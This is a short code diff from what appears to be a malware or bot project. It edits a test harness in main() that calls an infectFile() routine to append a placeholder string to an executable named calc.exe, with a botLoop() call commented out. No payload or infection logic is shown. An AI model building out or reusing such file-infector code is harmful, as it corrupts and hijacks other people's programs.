@@ -21,12 +21,12 @@ int main(int argc, char * argv[])
       botLoop();
     */
 
-    #define TESTSTR "AAAA"
-    if (infectFile(TESTSTR, 4, "C:\\Users\\null\\Documents\\calc.exe") != ERR_OK) {
-        D2("appendBuf2Bin failed.\n");
+    #define TESTSTR "AAAAAAAAAAAAAAAA"
+    if (infectFile(TESTSTR, 16, "C:\\Users\\null\\Documents\\calc.exe") != ERR_OK) {
+        D2("appendBuf2Bin() failed.\n");
     }
 
     D2("done.\n");
-    getchar();
+    //getchar();
     return 0;
 }
